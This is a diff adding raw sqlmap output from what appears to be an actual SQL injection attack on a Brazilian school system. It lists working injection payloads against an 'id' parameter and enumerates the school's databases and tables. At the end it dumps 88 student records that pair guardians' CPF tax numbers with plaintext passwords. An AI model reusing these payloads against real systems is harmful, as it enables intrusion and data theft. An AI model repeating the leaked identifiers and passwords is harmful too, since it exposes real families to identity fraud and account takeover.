@@ -1,0 +1,576 @@
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1310 AND 4791=4791
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1310 AND (SELECT 7232 FROM(SELECT COUNT(*),CONCAT(0x7170627071,(SELECT (ELT(7232=7232,1))),0x7171766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=1310 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=-5512 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170627071,0x71584b47636b43477853646e6b73494e61415958764b724c66685272526e6c4c5550524946626779,0x7171766b71),NULL,NULL,NULL-- NfPM
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [5]:
+[*] ctsfa_main
+[*] ctsfa_robo
+[*] ctsfa_robotica
+[*] ctsfa_temp
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1310 AND 4791=4791
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1310 AND (SELECT 7232 FROM(SELECT COUNT(*),CONCAT(0x7170627071,(SELECT (ELT(7232=7232,1))),0x7171766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=1310 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=-5512 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170627071,0x71584b47636b43477853646e6b73494e61415958764b724c66685272526e6c4c5550524946626779,0x7171766b71),NULL,NULL,NULL-- NfPM
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [5]:
+[*] ctsfa_main
+[*] ctsfa_robo
+[*] ctsfa_robotica
+[*] ctsfa_temp
+[*] information_schema
+
+Database: ctsfa_robotica
+[1 table]
++---------------------------------------+
+| login                                 |
++---------------------------------------+
+
+Database: ctsfa_robo
+[8 tables]
++---------------------------------------+
+| administrador                         |
+| aluno                                 |
+| calendario_aula                       |
+| fotos                                 |
+| kit_montagem                          |
+| professor                             |
+| relatorio                             |
+| turmas                                |
++---------------------------------------+
+
+Database: information_schema
+[76 tables]
++---------------------------------------+
+| ALL_PLUGINS                           |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| CHECK_CONSTRAINTS                     |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENABLED_ROLES                         |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GEOMETRY_COLUMNS                      |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_MUTEXES                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_SEMAPHORE_WAITS            |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_SYS_VIRTUAL                    |
+| INNODB_TABLESPACES_ENCRYPTION         |
+| INNODB_TABLESPACES_SCRUBBING          |
+| INNODB_TRX                            |
+| KEY_CACHES                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| SPATIAL_REF_SYS                       |
+| STATISTICS                            |
+| SYSTEM_VARIABLES                      |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| user_variables                        |
++---------------------------------------+
+
+Database: ctsfa_temp
+[49 tables]
++---------------------------------------+
+| acessos                               |
+| agenda_auditoria                      |
+| agenda_compromissos                   |
+| agenda_config                         |
+| agenda_usuarios                       |
+| alunos                                |
+| alunos2009                            |
+| alunos_20121108_1134                  |
+| artigos                               |
+| atividades                            |
+| auditoria                             |
+| avaliacaoensino                       |
+| avaliacaoprofessor                    |
+| avaliacoesrespostasaluno              |
+| bimestres                             |
+| categoria                             |
+| conceitos                             |
+| cronograma                            |
+| cursos                                |
+| descontos                             |
+| diariopedagogico                      |
+| diasletivos                           |
+| enquetes                              |
+| eventos                               |
+| eventosparticipantes                  |
+| flash                                 |
+| flash2                                |
+| frases                                |
+| frequencias                           |
+| funcionarios                          |
+| gradehorario                          |
+| grupos                                |
+| horarios                              |
+| inventariogrupos                      |
+| itenspatrimonio                       |
+| links                                 |
+| locais                                |
+| materias                              |
+| matriculas                            |
+| mural                                 |
+| notas                                 |
+| notas2009                             |
+| notas2010                             |
+| notas2011                             |
+| noticias                              |
+| patrimonio                            |
+| planosdecurso                         |
+| tiposdedias                           |
+| turmas                                |
++---------------------------------------+
+
+Database: ctsfa_main
+[53 tables]
++---------------------------------------+
+| acessos                               |
+| agenda_auditoria                      |
+| agenda_compromissos                   |
+| agenda_config                         |
+| agenda_usuarios                       |
+| alunos                                |
+| alunos2009                            |
+| alunos2013                            |
+| alunos20140328                        |
+| alunos_20121108_1134                  |
+| artigos                               |
+| atividades                            |
+| auditoria                             |
+| avaliacaoensino                       |
+| avaliacaoprofessor                    |
+| avaliacoesrespostasaluno              |
+| bimestres                             |
+| categoria                             |
+| conceitos                             |
+| cronograma                            |
+| cursos                                |
+| descontos                             |
+| diariopedagogico                      |
+| diasletivos                           |
+| enquetes                              |
+| eventos                               |
+| eventosparticipantes                  |
+| flash                                 |
+| flash2                                |
+| frases                                |
+| frequencias                           |
+| funcionarios                          |
+| gradehorario                          |
+| grupos                                |
+| horarios                              |
+| inventariogrupos                      |
+| itenspatrimonio                       |
+| links                                 |
+| locais                                |
+| materias                              |
+| matriculas                            |
+| mural                                 |
+| notas                                 |
+| notas2009                             |
+| notas2010                             |
+| notas2011                             |
+| notas2012                             |
+| notas_2013                            |
+| noticias                              |
+| patrimonio                            |
+| planosdecurso                         |
+| tiposdedias                           |
+| turmas                                |
++---------------------------------------+
+
+Database: ctsfa_robotica
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| login                                 | 3       |
++---------------------------------------+---------+
+
+Database: ctsfa_robo
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| aluno                                 | 107     |
+| relatorio                             | 24      |
+| professor                             | 14      |
+| fotos                                 | 13      |
+| turmas                                | 7       |
+| calendario_aula                       | 6       |
+| administrador                         | 3       |
+| kit_montagem                          | 2       |
++---------------------------------------+---------+
+
+Database: ctsfa_temp
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| cronograma                            | 27336   |
+| notas                                 | 8691    |
+| atividades                            | 2582    |
+| alunos                                | 1966    |
+| planosdecurso                         | 733     |
+| gradehorario                          | 554     |
+| diasletivos                           | 366     |
+| auditoria                             | 128     |
+| diariopedagogico                      | 104     |
+| funcionarios                          | 74      |
+| materias                              | 69      |
+| turmas                                | 30      |
+| artigos                               | 27      |
+| tiposdedias                           | 13      |
+| cursos                                | 8       |
+| categoria                             | 6       |
+| bimestres                             | 4       |
+| horarios                              | 3       |
++---------------------------------------+---------+
+
+Database: information_schema
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| COLUMNS                               | 2019    |
+| SESSION_VARIABLES                     | 640     |
+| SYSTEM_VARIABLES                      | 640     |
+| GLOBAL_VARIABLES                      | 622     |
+| GLOBAL_STATUS                         | 484     |
+| SESSION_STATUS                        | 484     |
+| COLLATION_CHARACTER_SET_APPLICABILITY | 322     |
+| COLLATIONS                            | 322     |
+| STATISTICS                            | 262     |
+| KEY_COLUMN_USAGE                      | 187     |
+| PARTITIONS                            | 187     |
+| TABLES                                | 187     |
+| TABLE_CONSTRAINTS                     | 137     |
+| ALL_PLUGINS                           | 79      |
+| SCHEMA_PRIVILEGES                     | 66      |
+| PLUGINS                               | 52      |
+| CHARACTER_SETS                        | 40      |
+| INNODB_FT_DEFAULT_STOPWORD            | 36      |
+| ENGINES                               | 8       |
+| SCHEMATA                              | 5       |
+| PROCESSLIST                           | 3       |
+| REFERENTIAL_CONSTRAINTS               | 3       |
+| SPATIAL_REF_SYS                       | 2       |
+| ENABLED_ROLES                         | 1       |
+| KEY_CACHES                            | 1       |
+| USER_PRIVILEGES                       | 1       |
++---------------------------------------+---------+
+
+Database: ctsfa_main
++---------------------------------------+---------+
+| Table                                 | Entries |
++---------------------------------------+---------+
+| acessos                               | 547762  |
+| auditoria                             | 139720  |
+| cronograma                            | 50724   |
+| notas2010                             | 9632    |
+| notas2012                             | 8691    |
+| notas2011                             | 7347    |
+| atividades                            | 5418    |
+| notas2009                             | 4822    |
+| notas_2013                            | 3498    |
+| avaliacoesrespostasaluno              | 3364    |
+| notas                                 | 2630    |
+| alunos2013                            | 2045    |
+| alunos_20121108_1134                  | 1782    |
+| matriculas                            | 1370    |
+| noticias                              | 1308    |
+| avaliacaoprofessor                    | 1290    |
+| alunos2009                            | 943     |
+| planosdecurso                         | 890     |
+| gradehorario                          | 596     |
+| alunos                                | 372     |
+| diasletivos                           | 366     |
+| alunos20140328                        | 318     |
+| flash                                 | 242     |
+| flash2                                | 222     |
+| avaliacaoensino                       | 124     |
+| diariopedagogico                      | 104     |
+| frases                                | 74      |
+| eventosparticipantes                  | 60      |
+| funcionarios                          | 53      |
+| agenda_compromissos                   | 51      |
+| materias                              | 44      |
+| locais                                | 37      |
+| artigos                               | 27      |
+| turmas                                | 24      |
+| itenspatrimonio                       | 14      |
+| tiposdedias                           | 13      |
+| enquetes                              | 10      |
+| links                                 | 9       |
+| cursos                                | 8       |
+| agenda_usuarios                       | 7       |
+| categoria                             | 6       |
+| descontos                             | 6       |
+| inventariogrupos                      | 6       |
+| conceitos                             | 5       |
+| agenda_auditoria                      | 4       |
+| bimestres                             | 4       |
+| eventos                               | 4       |
+| horarios                              | 3       |
+| agenda_config                         | 1       |
+| grupos                                | 1       |
++---------------------------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1310 AND 4791=4791
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1310 AND (SELECT 7232 FROM(SELECT COUNT(*),CONCAT(0x7170627071,(SELECT (ELT(7232=7232,1))),0x7171766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=1310 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=-5512 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170627071,0x71584b47636b43477853646e6b73494e61415958764b724c66685272526e6c4c5550524946626779,0x7171766b71),NULL,NULL,NULL-- NfPM
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: ctsfa_temp
+Table: alunos
+[13 columns]
++-----------------------+-------------+
+| Column                | Type        |
++-----------------------+-------------+
+| ativo                 | tinyint(1)  |
+| cidade                | varchar(30) |
+| cpfresponsavel        | varchar(11) |
+| endereco              | varchar(50) |
+| id                    | int(11)     |
+| login                 | varchar(20) |
+| matricula             | varchar(6)  |
+| nascimento            | date        |
+| nome                  | varchar(60) |
+| numero                | varchar(6)  |
+| responsavelfinanceiro | varchar(50) |
+| senha                 | varchar(6)  |
+| turma                 | varchar(6)  |
++-----------------------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1310 AND 4791=4791
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1310 AND (SELECT 7232 FROM(SELECT COUNT(*),CONCAT(0x7170627071,(SELECT (ELT(7232=7232,1))),0x7171766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=1310 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=-5512 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170627071,0x71584b47636b43477853646e6b73494e61415958764b724c66685272526e6c4c5550524946626779,0x7171766b71),NULL,NULL,NULL-- NfPM
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: ctsfa_temp
+Table: alunos
+[88 entries]
++----------------+--------+
+| cpfresponsavel | senha  |
++----------------+--------+
+| 56762208649    | 290603 |
+| 22010270649    | 110992 |
+| 74927736687    | 050595 |
+| 00000000000    | 030798 |
+| 00000000000    | 140900 |
+| 00000000000    | uu2820 |
+| 00000000000    | aa2824 |
+| 00000000000    | 123456 |
+| 92976735620    | 011208 |
+| 05272945603    | 012087 |
+| <blank>        | 270882 |
+| <blank>        | oe2633 |
+| 00000000000    | ee2627 |
+| <blank>        | ia3230 |
+| 00000000000    | ri5697 |
+| 00000000000    | dl5697 |
+| 0000000000     | da3231 |
+| 00000000000    | eh2122 |
+| 00000000000    | ji3431 |
+| <blank>        | re2628 |
+| <blank>        | ea3032 |
+| 00000000000    | ia2133 |
+| 00000000000    | ca2928 |
+| <blank>        | du2127 |
+| 00000000000    | ji3531 |
+| <blank>        | el2325 |
+| <blank>        | ze2826 |
+| <blank>        | lu2525 |
+| 00000000000    | tu2122 |
+| 00000000000    | la2526 |
+| <blank>        | ol4330 |
+| 36263982691    | mt6048 |
+| <blank>        | ce3833 |
+| 00000000000    | sa2026 |
+| <blank>        | ao5724 |
+| 00000000000    | ir5157 |
+| 04198179646    | 991402 |
+| 54748330678    | 290198 |
+| 00000000000    | 180696 |
+| 00000000000    | rl2129 |
+| 58563172620    | noguei |
+| <blank>        | ea2135 |
+| 00000000000    | se2222 |
+| 00000000000    | 141516 |
+| 74999605600    | ar5913 |
+| 00000000000    | 290196 |
+| 00000000000    | cl4914 |
+| <blank>        | abc123 |
+| <blank>        | ea2437 |
+| 54748330678    | 020893 |
+| 00000000000    | ru2021 |
+| 00000000000    | 160594 |
+| 00000000000    | bv3510 |
+| 00000000000    | mt5670 |
+| 00000000000    | aa2135 |
+| 62191667600    | ae5238 |
+| 52817008634    | st5724 |
+| 00000000000    | sd5724 |
+| 29834910649    | ăă8964 |
+| 57890870604    | lo5022 |
+| 00000000000    | ee2630 |
+| 48424501691    | tr6237 |
+| <blank>        | iu3331 |
+| <blank>        | la3024 |
+| 00000000000    | br5643 |
+| 00000000000    | vd5130 |
+| 00000000000    | aa3033 |
+| <blank>        | ri2427 |
+| 00000000000    | ru2227 |
+| <blank>        | ar2929 |
+| <blank>        | or2639 |
+| <blank>        | cu2326 |
+| <blank>        | de2927 |
+| <blank>        | eo2026 |
+| <blank>        | ta2925 |
+| 00000000000    | lirinh |
+| 00000000000    | 310196 |
+| 52898911615    | 270694 |
+| <blank>        | ca2425 |
+| <blank>        | tr2728 |
+| 0000000000     | ra2829 |
+| 00000000000    | ia2421 |
+| <blank>        | re2726 |
+| 00000000000    | us5076 |
+| 000000000      | ie2430 |
+| 00000000000    | js3533 |
+| 00000000000    | 230294 |
+| <blank>        | ra2732 |
++----------------+--------+
+
